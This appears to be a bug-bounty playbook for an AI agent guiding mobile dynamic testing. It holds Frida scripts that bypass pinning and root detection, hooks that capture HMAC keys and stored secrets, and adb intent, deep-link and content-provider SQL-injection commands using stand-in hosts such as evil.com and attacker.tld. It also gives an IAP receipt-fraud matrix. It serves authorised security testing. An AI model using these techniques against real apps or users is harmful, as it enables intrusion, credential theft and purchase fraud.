---
name: playbook-mobile-dynamic
description: Dynamic mobile instrumentation — Frida (iOS + Android), adb (Android only), objection. Bypass SSL pinning / root-JB detection to make Burp see traffic, hook crypto/HMAC/storage at runtime, abuse Android exported components and deep links, dump iOS keychain. Hand off to playbook-mobile-backend.md once traffic flows. Dynamic only — no static decompilation.
prerequisite: Operator has the APK/IPA installed on a real or emulated device. Frida server running on device (Android) or device jailbroken (iOS). adb authorized for Android targets. Burp CA cert pushed to device.
stop_condition: 15 host commands run with no bypass success (pinning still active) AND no backend traffic captured → tell operator manual reverse-engineering needed (out of scope here); bail to playbook-mobile-backend.md with whatever traffic is already captured.
---

# Mobile Dynamic Analysis Playbook

You are NOT instrumenting the device yourself. You are guiding the operator:
hand them **exact commands** to paste on their host, parse the output they
paste back, then feed extracted endpoints / secrets / tokens into Burp via
the MCP server for backend testing.

**Scope:** dynamic instrumentation only (Frida, adb, objection). Static
decompilation (apktool, jadx) is OUT of scope — if you need to know what's
in the binary, hook the runtime instead.

**The bug-bounty bar:**
- Pinning bypass / root detection bypass alone = **NOT REPORTABLE** on 95% of programs (hardening, not a vuln).
- These bypasses ARE the gate — they make backend traffic visible so you can find the bugs that pay. Frame them as means, not ends.
- A finding from the backend that you only reached via Frida is **still reportable**. The bypass is your tool, not your finding.

---

## Phase 0 — Prereqs the operator must confirm

Ask once at start. If any answer is "no", stop and have them set it up.

| Item | Android command | iOS command |
|---|---|---|
| Device reachable | `adb devices` shows device | `frida-ls-devices` shows USB device |
| Frida server running | `adb shell ps -A \| grep frida` shows PID | `frida-ps -U` returns processes |
| Root / jailbreak | `adb shell su -c id` → uid=0 | `frida-ps -Uai` works as root |
| Burp CA on device | Trusted credentials → User → PortSwigger | Settings → Profile → PortSwigger trusted |
| App installed | `adb shell pm list packages \| grep <pkg>` | `frida-ps -Uai \| grep <bundle>` |
| Proxy reachable from device | `adb shell curl -k https://<host>:8080` → Burp page | Safari → http://<host>:8080 → Burp page |

If proxy unreachable: same Wi-Fi or `adb reverse tcp:8080 tcp:8080` (Android USB) or set iOS HTTP proxy in Wi-Fi settings.

---

## Phase 1 — SSL pinning bypass (the gate)

**MASTG anchor:** `MASTG-TEST-0244` (Missing Certificate Pinning in Network Traffic). After bypass success, log "pinning was enforced and bypassed via <method>" in target notes — that's the audit-trail line. App that gives up traffic on FIRST try (no bypass needed) = MASTG-TEST-0244 FAIL (no pinning, report as such).

Without this, Burp sees TLS handshake errors and no app traffic. Try in order; stop at first success.

### Android — Frida (works on most apps)

```bash
# Generic OkHttp / OkHttp3 / TrustManager / Conscrypt / WebView pinning bypass
frida -U -f <pkg> -l ssl-pinning-bypass.js --no-pause

# Or objection (auto-detects common pinning libs)
objection -g <pkg> explore -s 'android sslpinning disable'
```

Recommended scripts (operator already has on disk):
- `frida-multiple-unpinning` — covers OkHttp, TrustManager, Conscrypt, WebView, Flutter
- `objection`'s built-in `android sslpinning disable`

**Confirm:** app loads, traffic appears via `get_proxy_history(limit=50, host="<api_host>")`.

### iOS — Frida

```bash
# Generic iOS SSL pinning bypass
frida -U -f <bundle_id> -l ios-ssl-bypass.js

# Or objection
objection -g <bundle_id> explore -s 'ios sslpinning disable'
```

Recommended: `frida-ios-ssl-bypass`, or on jailbroken devices the system-wide tweak `SSL Kill Switch 3` (set-and-forget).

### Framework-specific (Flutter / React Native / Xamarin)

These use their own TLS stacks and standard scripts miss them.

| Framework | Hint | Hook target |
|---|---|---|
| Flutter | `libflutter.so` present; Dart-only crash logs | `ssl_verify_callback` in BoringSSL inside `libflutter.so` (Frida `Module.findExportByName`) — use `frida-flutter` / `reflutter` |
| React Native | `index.android.bundle` present; check for `react-native-ssl-pinning` lib | Hook OkHttp normally; if `react-native-pinning` lib is bundled, hook its check fn |
| Xamarin | Mono runtime; `libmono*.so` / `Mono.Btls` strings | `mono_btls_x509_verify_param_set_callback` |
| Custom native | Crypto in `libnative.so`, no Java hooks fire | `Interceptor.attach` on the export that does the verify |

Tell operator: "Standard unpinning failed. App looks like `<framework>` — try `<framework>-specific script>`. If still failing after 3 attempts, bail to passive: capture whatever non-pinned subdomains the app talks to (auth, telemetry, CDN), some are still useful."

---

## Phase 2 — Root / Jailbreak detection bypass

Many apps run on rooted/JB devices fine. Only bypass if app refuses to start or locks features.

### Android — Frida

```bash
frida -U -f <pkg> -l root-detection-bypass.js --no-pause
# Or
objection -g <pkg> explore -s 'android root disable'
```

If generic fails, hook the specific check at runtime. Use Frida to enumerate suspicious calls:
```js
// Hook File.exists() — root detection often checks /system/xbin/su
Java.perform(function () {
  var File = Java.use('java.io.File');
  File.exists.implementation = function () {
    var path = this.getAbsolutePath();
    if (/(su|busybox|magisk|supersu|xposed)/i.test(path)) {
      console.log('[root-check blocked] ' + path);
      return false;
    }
    return this.exists();
  };
});

// Hook Runtime.exec for `su` / `which su`
Java.perform(function () {
  var Runtime = Java.use('java.lang.Runtime');
  Runtime.exec.overload('java.lang.String').implementation = function (cmd) {
    if (/(^|\s)su(\s|$)|magisk|busybox/.test(cmd)) {
      console.log('[exec blocked] ' + cmd);
      throw Java.use('java.io.IOException').$new('not found');
    }
    return this.exec(cmd);
  };
});
```

**Play Integrity / SafetyNet attestation** — these are server-side checks. You can't fully fake the device verdict, but capture the `attestation_token` request body and check **does the backend actually verify it?** If the app sends the token but the backend accepts requests without it (or with a stale one) → that's a reportable backend trust bug.

### iOS — Frida

```bash
frida -U -f <bundle_id> -l ios-jailbreak-bypass.js
# Or Liberty Lite / Choicy on jailbroken device (system-wide bypass)
```

If generic fails, hook specifics:
```js
// Hook NSFileManager fileExistsAtPath
var NSFileManager = ObjC.classes.NSFileManager;
var orig = NSFileManager['- fileExistsAtPath:'].implementation;
NSFileManager['- fileExistsAtPath:'].implementation = ObjC.implement(NSFileManager['- fileExistsAtPath:'], function (handle, sel, path) {
  var p = ObjC.Object(path).toString();
  if (/Cydia|MobileSubstrate|Sileo|frida|Snoop/.test(p)) {
    console.log('[JB-check blocked] ' + p);
    return 0;
  }
  return orig(handle, sel, path);
});
```

DeviceCheck / App Attest: same as Android Play Integrity — check whether backend actually validates the token; backend trust = bug.

---

## Phase 3 — Endpoint capture + handoff to backend playbook

Once traffic flows, populate Burp:

```python
# After ~30s of app usage:
get_proxy_history(limit=200, host="<api_host>")
extract_api_endpoints(index=<recent>)
search_history(query="/api/", in_url=True, limit=100)
search_history(query="/mobile/", in_url=True, limit=50)
search_history(query="X-Device-Id", in_request_body=True)
search_history(query="receipt", in_request_body=True)            # IAP
build_target_header_profile(<api_host>)                          # mobile UA + headers
save_target_intel(<api_host>, "endpoints", {...})
```

### MASTG network checks (run before handoff, while traffic is fresh)

**MASTG-TEST-0236 — Cleartext traffic** — any `http://` URL in mobile proxy history is a reportable misconfig (mobile networks expose users to passive sniffing).

```python
search_history(query="http://", in_url=True, limit=200)            # cleartext endpoints
# Filter to mobile-originated hosts (drop CDN/analytics if program excludes 3rd-party):
# any HTTP URL targeting an in-scope API host = MASTG-0236 FAIL
```

**MASTG-TEST-0218 — Insecure TLS protocols** — Burp's Logger records the negotiated TLS version per request. Pull the issued TLS-version distribution per host:

```bash
# From outside Burp — use nmap to probe directly (Burp doesn't downgrade, host might still accept):
nmap --script ssl-enum-ciphers -p 443 <api_host>
# FAIL conditions: TLS 1.0, TLS 1.1, SSLv3, NULL/RC4/EXPORT cipher, 3DES, anonymous DH
# PASS: TLS 1.2+ only, no RC4/NULL/3DES/EXPORT
```

Record the result with: `save_target_intel(<api_host>, "fingerprint", {"tls_audit": "<nmap-summary>", "cleartext_endpoints": [...]})`. Both checks above are independent findings — file them per MASTG-ID even if no other vuln is found in the backend phase.

**Stop here. Continue in `playbook-mobile-backend.md` §3.** This playbook's job ends when backend traffic is in Burp.

---

## Phase 4 — Frida hooks that pay (high-impact runtime extraction)

These hooks extract secrets that *enable* backend bugs. Run after Phase 3 if backend reveals signed / encrypted requests.

### A. Hook HMAC / signing key

If requests carry `X-Signature`, `signature`, `x-hmac`:
```js
// Android
Java.perform(function () {
  var Mac = Java.use('javax.crypto.Mac');
  Mac.init.overload('java.security.Key').implementation = function (key) {
    console.log('[HMAC key] ' + Buffer.from(key.getEncoded()).toString('hex'));
    return this.init(key);
  };
  Mac.doFinal.overload('[B').implementation = function (data) {
    console.log('[HMAC in ] ' + Buffer.from(data).toString('hex'));
    var out = this.doFinal(data);
    console.log('[HMAC out] ' + Buffer.from(out).toString('hex'));
    return out;
  };
});
```

iOS equivalent: hook `CCHmac` in libcommonCrypto.
```js
Interceptor.attach(Module.findExportByName('libCommonCrypto.dylib', 'CCHmac'), {
  onEnter: function (args) {
    this.key = Memory.readByteArray(args[1], args[2].toInt32());
    this.data = Memory.readByteArray(args[3], args[4].toInt32());
  },
  onLeave: function () {
    console.log('[HMAC key]  ' + hex(this.key));
    console.log('[HMAC data] ' + hex(this.data));
  }
});
```

Once you have the HMAC key, you can sign arbitrary requests offline → bypass all signature-based protection. **Critical-severity backend finding** (server trusts a client-derived signature).

### B. Hook crypto encrypt/decrypt

```js
// Android — javax.crypto.Cipher
Java.perform(function () {
  var Cipher = Java.use('javax.crypto.Cipher');
  Cipher.doFinal.overload('[B').implementation = function (b) {
    console.log('[Cipher ' + this.getAlgorithm() + ' mode=' + this.getOpmode() + ']');
    console.log('  in  : ' + Buffer.from(b).toString('hex'));
    var out = this.doFinal(b);
    console.log('  out : ' + Buffer.from(out).toString('hex'));
    return out;
  };
});
```

### C. Hook JNI native calls

If signing logic is in a native lib (`.so` / dyld image), the Java-level hook above won't fire.

```js
// Find candidate native exports — anything ending in _sign / _encrypt / _hmac
Process.enumerateModules().forEach(function (m) {
  if (m.name.indexOf('libnative') < 0 && m.name.indexOf('libsecurity') < 0) return;
  Module.enumerateExports(m.name).forEach(function (sym) {
    if (/sign|encrypt|hmac|sec/i.test(sym.name)) {
      console.log('[candidate] ' + m.name + '!' + sym.name);
    }
  });
});

// Then attach to the most promising one
Interceptor.attach(Module.findExportByName('libnative.so', 'Java_com_app_NativeCrypto_sign'), {
  onEnter: function (args) {
    // args[0]=JNIEnv, args[1]=thisObj/class, args[2]=first param
    console.log('[native sign called]');
  },
  onLeave: function (retval) {
    console.log('  -> ' + retval);
  }
});
```

### D. Hook token / receipt storage

```js
// Android SharedPreferences — every write is a candidate secret
Java.perform(function () {
  var SP = Java.use('android.app.SharedPreferencesImpl$EditorImpl');
  ['putString', 'putInt', 'putLong', 'putBoolean'].forEach(function (m) {
    SP[m].implementation = function (k, v) {
      console.log('[SP write] ' + k + ' = ' + v);
      return this[m](k, v);
    };
  });
});

// iOS keychain — objection one-liner instead of writing a script
// objection -g <bundle> explore -s 'ios keychain dump'
```

### E. Hook WebView / WKWebView JS bridge enumeration

```js
// Android — discover all addJavascriptInterface calls at runtime
Java.perform(function () {
  var WV = Java.use('android.webkit.WebView');
  WV.addJavascriptInterface.implementation = function (obj, name) {
    console.log('[JS bridge] window.' + name + ' -> ' + obj.getClass().getName());
    var methods = obj.getClass().getMethods();
    for (var i = 0; i < methods.length; i++) console.log('  ' + methods[i].getName());
    return this.addJavascriptInterface(obj, name);
  };
});

// iOS — same idea for WKScriptMessageHandler
ObjC.classes.WKUserContentController['- addScriptMessageHandler:name:'].implementation = function (handler, name) {
  console.log('[WK bridge] ' + ObjC.Object(name) + ' -> ' + handler);
  return this.addScriptMessageHandler_name_(handler, name);
};
```

### F. Hook URL scheme registration (iOS)

```js
// Capture all registered URL schemes at runtime (no plist parsing needed)
var info = ObjC.classes.NSBundle.mainBundle().infoDictionary();
var types = info.objectForKey_('CFBundleURLTypes');
if (types) console.log('[URL schemes] ' + types.toString());
```

---

## Phase 5 — Android adb dynamic surface

These don't apply to iOS. **Highest-paying class is exported components reachable from another app or a `intent://` URL in a browser.**

### A. Enumerate exported components at runtime

```bash
# All exported activities, services, receivers, providers — dynamic, no decompile
adb shell dumpsys package <pkg> | grep -B1 -A2 'android.intent.action' | head -80
adb shell cmd package query-activities --user 0 -a android.intent.action.MAIN -c android.intent.category.LAUNCHER -p <pkg>

# Just the exported=true components
adb shell dumpsys package <pkg> > /tmp/dumpsys.txt
grep -E 'Activity|Service|Provider|Receiver' /tmp/dumpsys.txt | grep -i exported=true
```

### B. Fire intents directly (the attack)

```bash
# Launch an exported activity with attacker-controlled extras
adb shell am start -n <pkg>/.<Activity> --es "url" "https://evil.com" --es "user_id" "victim"

# Trigger a deep link (also reachable from any app via Intent.parseUri or a browser intent://)
adb shell am start -W -a android.intent.action.VIEW -d "myapp://path?param=value"

# Broadcast — some apps trust broadcasts blindly
adb shell am broadcast -a com.app.ACTION_NAME --es key value -n <pkg>/.<Receiver>

# Bind a service
adb shell am startservice -n <pkg>/.<Service> --es key value
```

Combine with `adb logcat -d | grep <pkg>` in another shell to see what the app did with the intent — crashes, secret URLs hit, internal API calls.

### C. Content provider abuse

```bash
adb shell dumpsys package <pkg> | grep -A1 Provider
adb shell content query --uri content://com.app.provider/<table>
# If exported with no permission:
adb shell content query --uri content://com.app.provider/users --where "id='1'"
# SQLi probe in provider — keep payload non-destructive:
adb shell content query --uri content://com.app.provider/users --where "id='1' UNION SELECT 1,2,3--"
adb shell content insert --uri content://com.app.provider/admin --bind 'role:s:admin'
```

SQLi in a content provider = local data exfil. Reportable when any other app on device can pull PII or auth tokens.

### D. WebView bridge abuse (reachable via deep link)

Use the Frida hook from §4E to enumerate bridge names + methods at runtime. Then:
```bash
# Build attacker page calling window.<BridgeName>.<method>(args)
# Host it, then trigger the app's deep link that loads it in WebView:
adb shell am start -W -a android.intent.action.VIEW -d "myapp://webview?url=https://attacker.tld/bridge.html"
```

If JS reaches a Java method that returns sensitive data or executes shell-like operations → equivalent to **RCE in app context**. Critical-severity when reachable from a deep link (no install required for the attack).

### E. Backup / debuggable / log leak

```bash
# Backup data (only if android:allowBackup="true")
adb backup -f app.ab <pkg>
# Convert .ab → tar:
dd if=app.ab bs=24 skip=1 | zlib-flate -uncompress | tar -xv

# Debuggable app — read raw data
adb shell run-as <pkg> ls -la /data/data/<pkg>/
adb shell run-as <pkg> cat /data/data/<pkg>/shared_prefs/*.xml

# Log leak (some apps still log secrets on Android <13 or in release builds with leftover Log.d)
adb logcat -d | grep -iE "token|password|secret|api[_-]?key|bearer|jwt" | head -50
```

### F. Universal exported-component fuzz (one shell loop)

```bash
# Fire 1 intent at every exported activity, watch for crashes / unexpected behavior
adb shell dumpsys package <pkg> \
  | awk '/Activity Resolver/{flag=1} flag && /^[[:space:]]+[a-zA-Z0-9.]+\//{print $2}' \
  | sort -u \
  | while read comp; do
      echo "==> $comp"
      adb shell am start -n "$comp" --es id 1 --es user 1 --es admin 1 --ez debug true 2>&1 | head -3
      sleep 0.5
    done
```

Crash on attacker-launched flow with security impact (PII shown, admin UI reached, internal API called) = potential bug. Crash without impact = QA.

---

## Phase 6 — iOS dynamic surface

### A. URL schemes + Universal Links

Enumerate at runtime (Frida snippet in §4F). Then fire:
```bash
# Simulator
xcrun simctl openurl booted "myapp://path?param=value"

# Real device — easier via Safari address bar or an SMS/email with the link
```

If URL-scheme param reaches backend without sanitization → injection class (XSS / SQLi / SSRF) on backend, reachable via mobile deep link. Report as the backend class, mention deep-link as the vector.

### B. Keychain dump

```bash
objection -g <bundle> explore -s 'ios keychain dump'
# High-value items: refresh tokens, biometric-protected secrets, OAuth client_secret hardcoded in keychain,
# session cookies that survive uninstall (because keychain persists)
```

### C. Pasteboard / files / app group

```bash
objection -g <bundle> explore -s 'env'                              # paths inside sandbox
objection -g <bundle> explore -s 'ios pasteboard monitor'           # capture writes (some apps copy OTPs/tokens to pasteboard)
objection -g <bundle> explore -s 'ios nsuserdefaults get'           # read NSUserDefaults
# App Group containers (extensions / Watch app share data with main app):
# ~/Library/Group Containers/group.<id>/ — read via objection 'ls' / 'cat'
```

### D. UIWebView / WKWebView JS bridge

Use Frida hook from §4E. Then host an attacker page that posts a `WKScriptMessage` calling whatever native method the app exposes. Reach the WebView via:
- URL scheme → in-app browser
- Universal Link to an attacker-controlled path on a trusted domain
- A push notification with `url` payload (if app routes notifications into WebView)

Same impact class as Android WebView bridge — RCE in app context, reachable from mobile-only entry points.

---

## Phase 7 — IAP / receipt re-injection (cross-platform)

This pays. Backend trust of client-side receipts is one of the most common high-impact mobile findings.

### Capture

Once pinning is bypassed, the receipt-validate request lands in Burp. Look for:
- Endpoints: `/api/iap/verify`, `/subscription/validate`, `/purchases/acknowledge`, `/billing/redeem`
- Body fields: `purchase_token`, `transactionReceipt`, `signedData`, `signature`, `productId`, `orderId`

### Replay matrix

| Attack | How | Severity if confirmed |
|---|---|---|
| Cross-user receipt replay | Send your valid receipt with `user_id=<victim>` | HIGH — entitlement theft |
| Stale receipt acceptance | Send a 6+ month old receipt | MEDIUM — subscription extension |
| Receipt for product A → entitlement B | Swap `product_id` in request, keep receipt | CRITICAL — pay $1 for $100 |
| Sandbox receipt on prod | Sandbox Apple ID receipt → prod endpoint | CRITICAL — unlimited free purchases |
| Missing signature verify | Strip `signature`, send `signedData` only | CRITICAL — forge purchases |
| Receipt-less entitlement | `PATCH /me/subscription {"tier":"premium","valid_until":"2099-..."}` | CRITICAL — direct privilege escalation |
| Acknowledgement skip | Don't send the post-purchase ack — does entitlement remain after 3-day window? | MEDIUM — free perpetual usage |

**Google Play Billing v5/v6:** receipt is a JWS (`signedData.signature`). **Apple StoreKit 2:** receipt is also a JWS with Apple's public key published — server MUST verify; some skip and trust the parsed body.

Save with:
```python
save_finding(
    vuln_type="iap_bypass",  # or business_logic, mass_assignment
    severity="critical",     # adjust per matrix
    ...
)
```

---

## Phase 8 — Stop conditions and handoff

Bail when:
- 3 different pinning-bypass approaches attempted, all failed → tell operator the app uses a non-standard TLS stack (Flutter/BoringSSL, native cert validator, mTLS); the runtime hook needed isn't in this playbook. Continue with whatever traffic IS flowing (non-pinned subdomains: auth, CDN, telemetry).
- 15 host commands run with no backend traffic captured → operator setup is broken (device not on Burp's network, proxy not set on device, Burp CA missing); ask them to redo Phase 0.
- Backend traffic IS captured → exit this playbook, load `playbook-mobile-backend.md` §3.

**Handoff:**
```
Phase 1-2 unlocked traffic. Phase 3 captured endpoints + headers. Phase 4 (optional) extracted signing keys / bridge names. Now → playbook-mobile-backend.md §3.
```

---

## BBH ethics — what the operator must NEVER do

- Don't run on someone else's device — only their own test device.
- Don't dump the keychain of a production account that isn't theirs.
- Don't replay receipts to actually gain paid features beyond test scope.
- Don't keep extracted PII / tokens after the engagement.
- Don't submit pinning bypass / root detection bypass as a standalone finding — most programs treat it as out-of-scope hardening. Use it to find the backend bug; report THAT.

---

## Anti-patterns

- **Don't** spend more than 30 minutes on pinning bypass — if it's not working, switch to passive (non-pinned subdomains, web equivalent of the app, browser-shared cookies).
- **Don't** demand a jailbroken iPhone if the program lets you test on a non-jailbroken device — most programs treat jailbreak as out-of-scope assertions.
- **Don't** report client-side cert pinning absence — programs disagree on whether it's a finding; safer to ignore unless backend exposure follows.
- **Don't** treat exported-component crashes as bugs — crash without security impact is QA, not security.
- **Don't** report root/jailbreak detection bypass alone — same reasoning as pinning.
- **Don't** decompile — this playbook is dynamic-only. If you need to know what a function does, hook it, don't read it.
